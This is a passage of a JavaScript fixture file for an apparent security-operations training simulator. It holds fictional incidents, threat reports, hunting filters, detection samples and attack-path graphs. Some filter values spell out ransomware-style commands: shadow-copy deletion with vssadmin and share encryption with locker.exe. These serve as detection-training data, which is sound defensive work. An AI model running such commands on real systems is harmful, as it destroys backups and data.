      { time:'2026-06-28T12:03:00Z', node:'setns', alertId:'A501',
        title:'Namespace escape attempt',
        detail:'Container invoked setns() on host PID namespace.',
        remediation:'Cordon node; isolate workload; preserve image for forensics.' },
    ]
  },
  'INC-1053': {
    nodes:[
      { id:'sam', type:'User', label:'sam.lee@hacksmarterlabs.example', ring:0,
        verdict:'At risk', remediation:'Confirm sign-in with user; reset creds if needed.' },
      { id:'risky-ip', type:'IP', label:'91.219.236.54', ring:1,
        verdict:'Suspicious', remediation:'Block IP; check threat-intel reputation.' },
      { id:'unfamiliar-loc', type:'Location', label:'Unfamiliar city (BG)', ring:1,
        verdict:'Suspicious', remediation:'Compare to baseline travel.' },
      { id:'aad-policy', type:'Policy', label:'AAD risk-based CA', ring:1,
        verdict:'Triggered', remediation:'Verify policy required MFA + password change.' },
      { id:'token', type:'Token', label:'Refresh token', ring:1,
        verdict:'Held', remediation:'Revoke; force interactive sign-in.' },
      { id:'crm', type:'App', label:'Sales CRM', ring:2,
        verdict:'At risk', remediation:'Audit CRM access logs for sam.lee.' },
      { id:'salesforce', type:'App', label:'Salesforce (SSO)', ring:2,
        verdict:'At risk', remediation:'Review Salesforce login from same IP.' },
      { id:'sales-sp', type:'SharePoint site', label:'Sales SharePoint', ring:2,
        verdict:'At risk', remediation:'Audit doc access; revoke share links if leaked.' },
    ],
    edges:[
      { from:'risky-ip', to:'unfamiliar-loc', label:'resolves to', kind:'related' },
      { from:'risky-ip', to:'sam', label:'signed in as', kind:'attack' },
      { from:'sam', to:'aad-policy', label:'evaluated', kind:'related' },
      { from:'sam', to:'token', label:'holds', kind:'attack' },
      { from:'token', to:'crm', label:'SSO scope', kind:'blast' },
      { from:'token', to:'salesforce', label:'SSO scope', kind:'blast' },
      { from:'token', to:'sales-sp', label:'SSO scope', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T13:28:00Z', node:'sam', alertId:'A601',
        title:'High-risk sign-in (unfamiliar location)',
        detail:'Identity Protection flagged sign-in for sam.lee from a new city.',
        remediation:'Confirm with user; if unauthorized, revoke sessions + reset.' },
    ]
  },
  'INC-1054': {
    nodes:[
      { id:'bucket', type:'Storage', label:'aws-s3-prod-logs', ring:0,
        verdict:'Exposed', remediation:'Remove public-read ACL; add bucket policy guardrail.' },
      { id:'aws-acct', type:'Cloud account', label:'aws-prod', ring:1,
        verdict:'At risk', remediation:'Audit recent IAM changes.' },
      { id:'put-acl', type:'API call', label:'PutBucketAcl', ring:1,
        verdict:'Malicious', remediation:'Reverse change; capture caller.' },
      { id:'breakglass', type:'User', label:'aws-prod-breakglass', ring:1,
        verdict:'Suspicious', remediation:'Rotate creds; check MFA + last use.' },
      { id:'acl-public', type:'Policy', label:'public-read ACL', ring:1,
        verdict:'Misconfig', remediation:'Replace with private + signed URLs.' },
      { id:'cloudtrail', type:'Log', label:'CloudTrail event 9c2', ring:1,
        verdict:'Evidence', remediation:'Preserve; export for compliance.' },
      { id:'customer-data', type:'Data', label:'Customer telemetry', ring:2,
        verdict:'Exposed', remediation:'Determine what was readable + when.' },
      { id:'audit-logs', type:'Data', label:'Audit logs', ring:2,
        verdict:'Exposed', remediation:'Audit logs readable for window of exposure.' },
      { id:'siem-ingest', type:'Service', label:'SIEM ingestion pipe', ring:2,
        verdict:'At risk', remediation:'Bucket feeds SIEM — verify no tampering.' },
      { id:'gdpr', type:'Compliance', label:'GDPR exposure', ring:2,
        verdict:'Reportable', remediation:'Engage legal; clock starts on awareness.' },
    ],
    edges:[
      { from:'breakglass', to:'put-acl', label:'invoked', kind:'attack' },
      { from:'put-acl', to:'bucket', label:'on bucket', kind:'attack' },
      { from:'put-acl', to:'acl-public', label:'set', kind:'attack' },
      { from:'put-acl', to:'cloudtrail', label:'logged in', kind:'related' },
      { from:'bucket', to:'aws-acct', label:'belongs to', kind:'related' },
      { from:'acl-public', to:'customer-data', label:'exposes', kind:'blast' },
      { from:'acl-public', to:'audit-logs', label:'exposes', kind:'blast' },
      { from:'bucket', to:'siem-ingest', label:'feeds', kind:'blast' },
      { from:'customer-data', to:'gdpr', label:'triggers', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T07:53:00Z', node:'put-acl', alertId:'A701',
        title:'PutBucketAcl set public-read',
        detail:'Breakglass user changed bucket ACL to allow public reads.',
        remediation:'Reverse change; rotate breakglass creds; preserve CloudTrail.' },
    ]
  },
};

const THREAT_REPORTS = [
  { id:'TR-001', name:'Storm-1947 ransomware activity', type:'Ransomware', status:'Active campaign',
    impactedAssets:4, severity:'high', relatedIncidents:['INC-1050'], exposure:'2 exposed servers, 1 vulnerable signed driver, 1 unmanaged file share',
    summary:'Double-extortion ransomware operator using ScreenConnect for initial access; recent shift to BYOVD techniques.',
    overview:['Active exploitation is focused on remote management tools and finance file shares.','Tenant exposure is concentrated on FIN-FS-02 and two internet-facing endpoints.'],
    analystReport:['Treat remote interactive logons followed by shadow-copy deletion as high-confidence ransomware staging.','Prioritize device isolation and investigation package collection before restoring files.'],
    recommendations:['Contain FIN-FS-02 and confirm attack disruption actions completed.','Hunt for vssadmin.exe, wbadmin.exe, and suspicious driver loads in the last 7 days.','Patch exposed remote management tools or remove external access.'] },
  { id:'TR-002', name:'Midnight Blizzard credential-theft phishing', type:'Activity group',
    status:'Active campaign', impactedAssets:1, severity:'high', relatedIncidents:['INC-1042'], exposure:'1 OAuth app consent, 1 affected mailbox, 3 broad Graph permissions',
    summary:'State-aligned actor targeting M365 admins via device-code phishing into OAuth consent grants.',
    overview:['The report connects phishing, OAuth consent, and Graph mailbox access into one investigation path.','The lab tenant has one matching incident: Jane Doe granting DocViewer Pro mail and file scopes.'],
    analystReport:['OAuth persistence survives password reset until consent and refresh tokens are revoked.','Graph activity logs help confirm whether the app enumerated messages, files, or directory objects after consent.'],
    recommendations:['Revoke DocViewer Pro consent and Jane Doe sessions.','Query CloudAppEvents and GraphActivityLogs for the app ID.','Review app governance for unverified publishers requesting mail write scopes.'] },
  { id:'TR-003', name:'AiTM phishing kits (Tycoon 2FA)', type:'Tool', status:'Active campaign',
    impactedAssets:2, severity:'medium', relatedIncidents:['INC-1051','INC-1053'], exposure:'2 risky sign-ins, 1 MFA-proxied session, 1 blocked Azure Portal attempt',
    summary:'Adversary-in-the-middle phishing pages proxy MFA prompts and steal session cookies; bypasses non-FIDO MFA.',
    overview:['The campaign explains why a successful MFA prompt can still be suspicious.','Relevant tenant signals are unfamiliar properties, impossible travel, and follow-on portal access.'],
    analystReport:['A valid MFA result is not a benign signal when the session source, user agent, and travel pattern are abnormal.','Use risk detections to decide whether to confirm compromise or dismiss user risk.'],
    recommendations:['Revoke sessions for Maria Ross and Sam Lee pending user validation.','Require phishing-resistant MFA for finance and admin users.','Create a hunting query for risky sign-ins followed by Graph or Azure Portal access.'] },
  { id:'TR-004', name:'AsyncRAT delivered via .lnk in archives', type:'Malware',
    status:'Active campaign', impactedAssets:0, severity:'medium', relatedIncidents:[], exposure:'No matching tenant assets in the last 30 days',
    summary:'Commodity RAT delivered through .zip → .lnk → PowerShell chain; persists via Run key.',
    overview:['No active exposure is present, so use this report as preventive detection guidance.','The useful outcome is a custom detection for suspicious archive-to-script execution chains.'],
    analystReport:['Commodity RAT delivery changes file names frequently, so behavior-based detections are more durable than hash-only matching.'],
    recommendations:['Keep ASR blocking script-launched executables enabled.','Hunt for .lnk launches from archive extraction paths.','Monitor new startup Run key values created by Office or archive child processes.'] },
];

const HUNTING_TABLES = ['AlertEvidence','AlertInfo','CloudAppEvents','DeviceEvents',
  'DeviceFileCertificateInfo','DeviceFileEvents','DeviceImageLoadEvents','DeviceInfo',
  'DeviceLogonEvents','DeviceNetworkEvents','DeviceNetworkInfo','DeviceProcessEvents',
  'DeviceRegistryEvents','DeviceTvmSecureConfigurationAssessment',
  'DeviceTvmSecureConfigurationAssessmentKB','DeviceTvmSoftwareInventory',
  'DeviceTvmSoftwareVulnerabilities','DeviceTvmSoftwareVulnerabilitiesKB',
  'EmailAttachmentInfo','EmailEvents','EmailPostDeliveryEvents','EmailUrlInfo','UrlClickEvents',
  'IdentityDirectoryEvents','IdentityInfo','IdentityLogonEvents','IdentityQueryEvents',
  'GraphActivityLogs','OAuthAppInfo','SigninLogs','ContainerEvents'];

const HUNTING_SCHEMA_GROUPS = [
  { name:'Alerts', tables:['AlertInfo','AlertEvidence'] },
  { name:'Apps & identities',
    tables:['IdentityInfo','IdentityLogonEvents','IdentityQueryEvents',
      'IdentityDirectoryEvents','CloudAppEvents','GraphActivityLogs','OAuthAppInfo'] },
  { name:'Email',
    tables:['EmailEvents','EmailAttachmentInfo','EmailUrlInfo',
      'EmailPostDeliveryEvents','UrlClickEvents'] },
  { name:'Devices',
    tables:['DeviceInfo','DeviceNetworkInfo','DeviceProcessEvents',
      'DeviceNetworkEvents','DeviceFileEvents','DeviceRegistryEvents',
      'DeviceLogonEvents','DeviceImageLoadEvents','DeviceEvents'] },
  { name:'Vulnerability management',
    tables:['DeviceTvmSoftwareInventory','DeviceTvmSoftwareVulnerabilities',
      'DeviceTvmSoftwareVulnerabilitiesKB','DeviceTvmSecureConfigurationAssessment',
      'DeviceTvmSecureConfigurationAssessmentKB'] },
];

// Guided hunting (query builder). Mirrors advanced hunting guided mode: pick a
// data domain, then build conditions from dropdowns instead of writing KQL.
// Basic filters are AND-only; the All filters toggle unlocks the full set plus
// OR grouping, matching the product. Filter columns and their suggested values
// are drawn from the bundled fixtures so a built query actually returns rows.
const GUIDED_HUNTING_DOMAINS = [
  { id:'all',       label:'All domains',             hint:'Look through all available data in your query.' },
  { id:'endpoints', label:'Endpoints',               hint:'Endpoint data as provided by Microsoft Defender for Endpoint.' },
  { id:'email',     label:'Email and collaboration', hint:'Email and collaboration app data. Same data Threat explorer users know.' },
  { id:'apps',      label:'Apps and identities',     hint:'Data from Defender for Cloud Apps and Defender for Identity.' },
  { id:'cloud',     label:'Cloud infrastructure',    hint:'Cloud infrastructure data as provided by Microsoft Defender for Cloud.' },
  { id:'exposure',  label:'Exposure management',     hint:'Data as provided by Microsoft Security Exposure Management.' },
];

// Operators offered per column type. Every one of these is understood by the
// bundled mock KQL evaluator, so guided queries stay runnable.
const GUIDED_HUNTING_OPERATORS = {
  string: ['==', '!=', 'contains', 'startswith', 'endswith', 'has'],
  number: ['==', '!=', '>', '<', '>=', '<='],
  bool:   ['==', '!='],
};

// Sections ending in "info" hold entity-state filters; sections ending in
// "events" hold monitored-event filters — the same split the product uses.
const GUIDED_HUNTING_FILTERS = [
  // --- Endpoints -----------------------------------------------------------
  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
    column:'FileName', label:'File name', type:'string', basic:true,
    values:['vssadmin.exe','locker.exe','scanner.exe'] },
  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
    column:'AccountName', label:'Account name', type:'string', basic:true,
    values:['jdoe','svc-scan','fin-svc'] },
  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
    column:'DeviceName', label:'Device name', type:'string', basic:true,
    values:['WKS-01','WKS-02','WKS-03','FIN-FS-02'] },
  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
    column:'FolderPath', label:'Folder path', type:'string', basic:false,
    values:['C:\\Users\\Public\\scanner.exe','C:\\Windows\\System32\\vssadmin.exe','C:\\ProgramData\\locker.exe'] },
  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
    column:'ProcessCommandLine', label:'Process command line', type:'string', basic:false,
    values:['vssadmin delete shadows /all /quiet','locker.exe --encrypt --shares'] },
  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
    column:'AttackTechniques', label:'Attack techniques', type:'string', basic:false,
    values:['T1036','T1490','T1486','T1595'] },
  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
    column:'ActionType', label:'Action type', type:'string', basic:true,
    values:['LogonSuccess','LogonFailed'] },
  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
    column:'LogonType', label:'Logon type', type:'string', basic:true,
    values:['Interactive','Network','RemoteInteractive'] },
  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
    column:'AccountName', label:'Account name', type:'string', basic:false,
    values:['svc-backup','fin-svc','jdoe'] },
  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
    column:'Protocol', label:'Protocol', type:'string', basic:false,
    values:['Kerberos','NTLM'] },
  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
    column:'IsLocalAdmin', label:'Is local admin', type:'bool', basic:false,
    values:['true','false'] },
  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
    column:'RemoteIP', label:'Remote IP', type:'string', basic:false,
    values:['10.20.4.55','10.20.7.14'] },
  { domain:'endpoints', section:'Device network events', table:'DeviceNetworkEvents',
    column:'RemoteIP', label:'Remote IP', type:'string', basic:true,
    values:['185.199.111.12'] },
  { domain:'endpoints', section:'Device network events', table:'DeviceNetworkEvents',
    column:'RemotePort', label:'Remote port', type:'number', basic:false,
    values:['443','80'] },
  { domain:'endpoints', section:'Device info', table:'DeviceInfo',
    column:'OSPlatform', label:'OS platform', type:'string', basic:true,
    values:['Windows 11 Enterprise','Windows Server 2022'] },
  { domain:'endpoints', section:'Device info', table:'DeviceInfo',
    column:'IsInternetFacing', label:'Is internet facing', type:'bool', basic:false,
    values:['true','false'] },

  // --- Apps and identities -------------------------------------------------
  { domain:'apps', section:'Identity logon events', table:'IdentityLogonEvents',
    column:'ActionType', label:'Action type', type:'string', basic:true,
    values:['LogonSuccess','LogonFailed','DirectoryServicesReplication'] },
  { domain:'apps', section:'Identity logon events', table:'IdentityLogonEvents',
    column:'AccountUpn', label:'Account UPN', type:'string', basic:true,
    values:['svc-backup@hacksmarterlabs.example','fin-svc@hacksmarterlabs.example','jane.doe@hacksmarterlabs.example'] },
  { domain:'apps', section:'Identity logon events', table:'IdentityLogonEvents',
    column:'Protocol', label:'Protocol', type:'string', basic:false,
    values:['Kerberos','NTLM'] },
  { domain:'apps', section:'Identity logon events', table:'IdentityLogonEvents',
    column:'IPAddress', label:'IP address', type:'string', basic:false,
    values:['10.20.4.55','10.20.7.14','10.20.7.42'] },
  { domain:'apps', section:'Cloud app events', table:'CloudAppEvents',
    column:'ActionType', label:'Action type', type:'string', basic:true,
    values:['Consent to application','PutBucketAcl'] },
  { domain:'apps', section:'Cloud app events', table:'CloudAppEvents',
    column:'AccountDisplayName', label:'Account display name', type:'string', basic:false,
    values:['Jane Doe','aws-prod-breakglass'] },
  { domain:'apps', section:'Sign-in logs', table:'SigninLogs',
    column:'RiskLevel', label:'Risk level', type:'string', basic:true,
    values:['High','Medium','Low'] },
  { domain:'apps', section:'Sign-in logs', table:'SigninLogs',
    column:'UserPrincipalName', label:'User principal name', type:'string', basic:false,
    values:['sam.lee@hacksmarterlabs.example','maria.ross@hacksmarterlabs.example'] },

  // --- Cloud infrastructure ------------------------------------------------
  { domain:'cloud', section:'Container events', table:'ContainerEvents',
    column:'ClusterName', label:'Cluster name', type:'string', basic:true, values:['aks-prod'] },
  { domain:'cloud', section:'Container events', table:'ContainerEvents',
    column:'Image', label:'Image', type:'string', basic:true, values:['hacksmarterlabs/api:2026.06'] },
  { domain:'cloud', section:'Container events', table:'ContainerEvents',
    column:'Syscall', label:'Syscall', type:'string', basic:false, values:['setns'] },

  // --- Exposure management -------------------------------------------------
  { domain:'exposure', section:'Device info', table:'DeviceInfo',
    column:'ExposureLevel', label:'Exposure level', type:'string', basic:true,
    values:['High','Medium','Low'] },
  { domain:'exposure', section:'Device info', table:'DeviceInfo',
    column:'IsInternetFacing', label:'Is internet facing', type:'bool', basic:true,
    values:['true','false'] },
  { domain:'exposure', section:'Device info', table:'DeviceInfo',
    column:'PublicIP', label:'Public IP', type:'string', basic:false,
    values:['198.51.100.41'] },
];

// Sample queries offered by the Load sample queries dropdown. Each is expressed
// as builder state so loading one shows how the conditions map to KQL.
const GUIDED_HUNTING_SAMPLES = [
  { id:'shadow-copy', domain:'endpoints', label:'Shadow copy deletion attempts',
    table:'DeviceProcessEvents', join:'and',
    conditions:[{ column:'FileName', op:'==', value:'vssadmin.exe' }] },
  { id:'failed-logons', domain:'endpoints', label:'Failed logons by logon type',
    table:'DeviceLogonEvents', join:'and',
    conditions:[{ column:'ActionType', op:'==', value:'LogonFailed' }] },
  { id:'public-folder-exec', domain:'endpoints', label:'Execution from a public folder',
    table:'DeviceProcessEvents', join:'and',
    conditions:[{ column:'FolderPath', op:'startswith', value:'C:\\Users\\Public' }] },
  { id:'internet-facing', domain:'exposure', label:'Internet-facing devices at high exposure',
    table:'DeviceInfo', join:'and',
    conditions:[{ column:'IsInternetFacing', op:'==', value:'true' },
                { column:'ExposureLevel', op:'==', value:'High' }] },
  { id:'ntlm-logons', domain:'apps', label:'NTLM identity logons (Kerberos fallback)',
    table:'IdentityLogonEvents', join:'and',
    conditions:[{ column:'ActionType', op:'==', value:'LogonSuccess' },
                { column:'Protocol', op:'==', value:'NTLM' }] },
];

const HUNTING_SCHEMA_NOTES = [
  { title:'Event and activity tables',
    detail:'Alert, endpoint, email, identity, cloud app, and assessment events arrive shortly after the source service processes sensor data.' },
  { title:'Entity tables',
    detail:'Device, identity, network, and inventory records are refreshed about every 15 minutes, then consolidated into fuller entity snapshots daily.' },
  { title:'Time zone',
    detail:'Advanced hunting timestamps are UTC. Convert during reporting, but keep KQL joins and detection windows in UTC.' },
  { title:'Schema reference',
    detail:'Use table descriptions, column lists, ActionType values, and samples to decide whether to hunt in event tables or entity tables.' },
];

const CUSTOM_DETECTION_FREQUENCIES = [
  { frequency:'Continuous (NRT)', lookback:'Near real time',
    use:'Use for high-confidence event patterns where the SOC can respond quickly.' },
  { frequency:'Every hour', lookback:'Past 4 hours',
    use:'Good for fast recurring checks that can tolerate a short delay.' },
  { frequency:'Every 3 hours', lookback:'Past 12 hours',
    use:'Useful for bursty activity and medium-volume detections.' },
  { frequency:'Every 12 hours', lookback:'Past 48 hours',
    use:'Use for posture or lower-urgency reviews.' },
  { frequency:'Every 24 hours', lookback:'Past 30 days',
    use:'Best for daily hygiene or rare-condition detections.' },
];

const CUSTOM_DETECTION_RESPONSE_ACTIONS = [
  { entity:'DeviceId', actions:['Isolate device','Collect investigation package','Run antivirus scan','Initiate investigation'] },
  { entity:'SHA1 or InitiatingProcessSHA1', actions:['Allow or block file','Quarantine file'] },
];

const CUSTOM_DETECTION_SAMPLE = {
  name:'Repeated antivirus detections by device',
  requiredColumns:['Timestamp','DeviceId','ReportId'],
  query:`DeviceEvents
| where Timestamp > ago(7d)
| where ActionType == "AntivirusDetection"
| summarize (Timestamp, ReportId)=arg_max(Timestamp, ReportId), count() by DeviceId
| where count_ > 5`,
};

// Fictional local-only exposure graph used by the interactive hunting graph lab.
// Scenario names and input shapes track the current Product documentation workflow;
// entities and relationships are deliberately invented for this simulator.
const HUNTING_GRAPH_ENTITIES = [
  { id:'guest-kim', type:'External user', label:'kim@fabrikam.example', risk:'medium', internet:true, riskScore:true, detail:'Guest account with a project-scoped cloud role.' },
  { id:'user-jane', type:'User', label:'jane.doe@hacksmarterlabs.example', risk:'high', riskScore:true, detail:'Finance analyst linked to the OAuth-consent investigation.' },
  { id:'user-jordan', type:'User', label:'jordan.wilber@hacksmarterlabs.example', risk:'low', detail:'Developer with inherited repository and storage access.' },
  { id:'user-helpdesk', type:'User', label:'lee.helpdesk@hacksmarterlabs.example', risk:'medium', vulnerable:true, riskScore:true, detail:'Helpdesk identity with password-reset delegation.' },
  { id:'user-tier0', type:'Sensitive identity', label:'admin.tier0@hacksmarterlabs.example', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Tier 0 administrator protected as a sensitive identity.' },
  { id:'user-asrep', type:'User', label:'legacy.batch@hacksmarterlabs.example', risk:'high', vulnerable:true, riskScore:true, detail:'Legacy account with Kerberos preauthentication disabled.' },
  { id:'user-hybrid', type:'Hybrid user', label:'svc.sync.owner@hacksmarterlabs.example', risk:'medium', critical:true, riskScore:true, detail:'Synced account that owns a privileged OAuth application.' },
  { id:'svc-sql', type:'Service account', label:'svc-sql-reporting', risk:'high', vulnerable:true, riskScore:true, detail:'Kerberoastable service account used by the reporting tier.' },
  { id:'svc-backup', type:'Service account', label:'svc-backup', risk:'medium', riskScore:true, detail:'Backup service identity with legacy RDP permissions.' },
  { id:'device-fin-wks07', type:'Device', label:'FIN-WKS-07', risk:'high', vulnerable:true, riskScore:true, detail:'Finance workstation with suspicious PowerShell activity.' },
  { id:'device-byod22', type:'Device', label:'BYOD-22', risk:'medium', internet:true, riskScore:true, detail:'Personally managed device with a recent storage session.' },
  { id:'device-admin01', type:'Device', label:'ADM-WKS-01', risk:'medium', critical:true, riskScore:true, detail:'Privileged-access workstation used by Tier 0 staff.' },
  { id:'device-edge01', type:'Device', label:'EDGE-WKS-01', risk:'high', vulnerable:true, internet:true, riskScore:true, detail:'Internet-exposed endpoint with an overdue security update.' },
  { id:'server-finfs02', type:'Server', label:'FIN-FS-02', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Critical finance file server containing payroll exports.' },
  { id:'server-dc01', type:'Domain controller', label:'DC-01', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Domain controller representing the domain-compromise target.' },
  { id:'group-helpdesk', type:'Group', label:'Tier 1 Helpdesk', risk:'medium', riskScore:true, detail:'Support group with delegated account-management rights.' },
  { id:'group-storage', type:'Group', label:'Sensitive Storage Readers', risk:'medium', sensitive:true, riskScore:true, detail:'Group that grants read access to sensitive storage.' },
  { id:'group-domainadmins', type:'Group', label:'Domain Admins', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Highest-privilege on-premises administrative group.' },
  { id:'group-cloud', type:'Group', label:'Cloud Resource Contributors', risk:'high', critical:true, riskScore:true, detail:'Synced group carrying broad cloud-resource permissions.' },
  { id:'app-docviewer', type:'OAuth application', label:'DocViewer Pro', risk:'high', vulnerable:true, riskScore:true, detail:'Unverified OAuth app with mailbox and file permissions.' },
  { id:'app-syncbridge', type:'OAuth application', label:'SyncBridge Legacy', risk:'high', critical:true, riskScore:true, detail:'Hybrid-owned app able to authenticate as a privileged service principal.' },
  { id:'sp-storage', type:'Service principal', label:'sp-storage-export', risk:'high', critical:true, riskScore:true, detail:'Automation identity with permissions on storage and SQL.' },
  { id:'sp-automation', type:'Service principal', label:'sp-prod-automation', risk:'medium', critical:true, riskScore:true, detail:'Production automation identity with cluster and vault roles.' },
  { id:'storage-payroll', type:'Storage account', label:'stpayrollprod', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Production storage containing payroll and tax exports.' },
  { id:'storage-research', type:'Storage account', label:'stresearcharchive', risk:'medium', sensitive:true, riskScore:true, detail:'Research archive marked as containing sensitive data.' },
  { id:'kv-prod', type:'Key vault', label:'kv-prod-finance', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Production vault containing finance application secrets.' },
  { id:'sql-finance', type:'SQL data store', label:'sql-finance-prod', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Finance SQL store reachable through shared automation identities.' },
  { id:'k8s-payments', type:'Kubernetes cluster', label:'aks-payments-prod', risk:'high', critical:true, vulnerable:true, riskScore:true, detail:'Critical payments cluster with a vulnerable administration path.' },
  { id:'repo-payments', type:'Azure DevOps repository', label:'Payments/API', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Repository containing payment-service deployment definitions.' },
  { id:'tenant-hacksmarterlabs', type:'Active Directory domain', label:'hacksmarterlabs.example', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Domain object whose replication rights enable DCSync.' },
  { id:'ip-76', type:'IP address', label:'76.21.55.4', risk:'high', internet:true, riskScore:true, detail:'External address observed during the phishing-to-OAuth incident.' },
  { id:'mailbox-jane', type:'Mailbox', label:'Jane Doe mailbox', risk:'high', sensitive:true, riskScore:true, detail:'Mailbox accessible through the risky OAuth application.' },
  { id:'subscription-prod', type:'Cloud resource', label:'Production subscription', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Production cloud scope inherited by contributor principals.' },
];

const HUNTING_GRAPH_SCENARIOS = [
  { id:'attack-path-critical-asset', name:'Attack paths to critical asset', question:'Which routes could allow lateral movement to a critical asset?', techniques:['Lateral movement','Exploratory'],
    inputs:[{ key:'target', label:'Target critical asset', bindNode:'kv-prod', options:['kv-prod','sql-finance','k8s-payments'] }],
    nodes:['guest-kim','group-cloud','sp-automation','kv-prod','user-jordan'],
    edges:[{from:'guest-kim',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sp-automation',label:'can authenticate as'},{from:'sp-automation',to:'kv-prod',label:'has role on'},{from:'user-jordan',to:'sp-automation',label:'has permissions to',shortest:false}] },
  { id:'entity-relationship-map', name:'Entity relationship map', question:'What direct incoming and outgoing relationships surround an entity?', techniques:['Exploratory'],
    inputs:[{ key:'source', label:'Source entity', bindNode:'user-jane', options:['user-jane','device-fin-wks07','app-docviewer'] }],
    nodes:['user-jane','device-fin-wks07','app-docviewer','ip-76','mailbox-jane'],
    edges:[{from:'ip-76',to:'user-jane',label:'frequently logged in by'},{from:'user-jane',to:'device-fin-wks07',label:'frequently logged in by'},{from:'user-jane',to:'app-docviewer',label:'has permissions to'},{from:'app-docviewer',to:'mailbox-jane',label:'has permissions to'}] },
  { id:'paths-between-entities', name:'Paths between two entities', question:'Is there a traversable path from one selected entity to another?', techniques:['Lateral movement','Exploratory'],
    inputs:[{ key:'start', label:'Start data source', bindNode:'device-fin-wks07', options:['device-fin-wks07','device-byod22','guest-kim'] },{ key:'target', label:'Target data source', bindNode:'storage-payroll', options:['storage-payroll','kv-prod','sql-finance'] }],
    nodes:['device-fin-wks07','user-jane','group-storage','storage-payroll','app-docviewer'],
    edges:[{from:'device-fin-wks07',to:'user-jane',label:'frequently logged in by'},{from:'user-jane',to:'group-storage',label:'member of'},{from:'group-storage',to:'storage-payroll',label:'has permissions to'},{from:'user-jane',to:'app-docviewer',label:'has permissions to',shortest:false},{from:'app-docviewer',to:'storage-payroll',label:'has permissions to',shortest:false}] },
  { id:'access-key-vaults', name:'Access to key vaults', question:'Which entities have direct or indirect access to a selected key vault?', techniques:['Lateral movement','Collection'],
    inputs:[{ key:'target', label:'Target key vault', bindNode:'kv-prod', options:['kv-prod'] }],
    nodes:['guest-kim','group-cloud','sp-automation','kv-prod','device-admin01'],
    edges:[{from:'guest-kim',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sp-automation',label:'can authenticate as'},{from:'sp-automation',to:'kv-prod',label:'has role on'},{from:'device-admin01',to:'kv-prod',label:'has permissions to',shortest:false}] },
  { id:'users-sensitive-data', name:'Users with access to sensitive data', question:'Which users can reach a selected sensitive storage account?', techniques:['Lateral movement','Exploratory','Collection'],
    inputs:[{ key:'target', label:'Target storage account', bindNode:'storage-payroll', options:['storage-payroll','storage-research'] }],
    nodes:['user-jane','user-jordan','group-storage','storage-payroll'],
    edges:[{from:'user-jane',to:'group-storage',label:'member of'},{from:'user-jordan',to:'group-storage',label:'member of'},{from:'group-storage',to:'storage-payroll',label:'has permissions to'}] },
  { id:'critical-identities-storage', name:'Critical identities with storage access', question:'Which privileged identities can reach sensitive storage?', techniques:['Lateral movement','Collection'], inputs:[],
    nodes:['user-tier0','group-cloud','sp-storage','storage-payroll','storage-research'],
    edges:[{from:'user-tier0',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sp-storage',label:'can authenticate as'},{from:'sp-storage',to:'storage-payroll',label:'has permissions to'},{from:'sp-storage',to:'storage-research',label:'has permissions to',shortest:false}] },
  { id:'device-exfiltration', name:'Potential data exfiltration by device', question:'Which storage accounts can a selected device access?', techniques:['Exploratory','Collection'],
    inputs:[{ key:'source', label:'Source device', bindNode:'device-byod22', options:['device-byod22','device-fin-wks07'] }],
    nodes:['device-byod22','user-jane','app-docviewer','storage-payroll','storage-research'],
    edges:[{from:'device-byod22',to:'user-jane',label:'frequently logged in by'},{from:'user-jane',to:'app-docviewer',label:'has permissions to'},{from:'app-docviewer',to:'storage-payroll',label:'has permissions to'},{from:'app-docviewer',to:'storage-research',label:'has permissions to',shortest:false}] },
  { id:'critical-kubernetes', name:'Attack paths to critical Kubernetes clusters', question:'Which actors can reach a highly critical Kubernetes cluster?', techniques:['Privilege escalation','Lateral movement'],
    inputs:[{ key:'target', label:'Target Kubernetes cluster', bindNode:'k8s-payments', options:['k8s-payments'] }],
    nodes:['user-jordan','repo-payments','sp-automation','k8s-payments','guest-kim'],
    edges:[{from:'user-jordan',to:'repo-payments',label:'has permissions to'},{from:'repo-payments',to:'sp-automation',label:'has credentials of'},{from:'sp-automation',to:'k8s-payments',label:'has role on'},{from:'guest-kim',to:'sp-automation',label:'can authenticate as',shortest:false}] },
  { id:'azure-devops-access', name:'Access to Azure DevOps repositories', question:'Who can read or write a selected Azure DevOps repository?', techniques:['Collection'],
    inputs:[{ key:'target', label:'Target ADO repository', bindNode:'repo-payments', options:['repo-payments'] }],
    nodes:['user-jordan','user-jane','group-cloud','repo-payments'],
    edges:[{from:'user-jordan',to:'repo-payments',label:'has permissions to'},{from:'user-jane',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'repo-payments',label:'has permissions to'}] },
  { id:'sql-choke-points', name:'Choke points to SQL data stores', question:'Which shared nodes appear in the most paths leading to SQL data?', techniques:['Lateral movement','Collection'], inputs:[],
    nodes:['user-jane','user-jordan','group-cloud','sp-storage','sql-finance'],
    edges:[{from:'user-jane',to:'group-cloud',label:'member of'},{from:'user-jordan',to:'group-cloud',label:'member of'},{from:'group-cloud',to:'sp-storage',label:'can authenticate as'},{from:'sp-storage',to:'sql-finance',label:'has permissions to'}] },
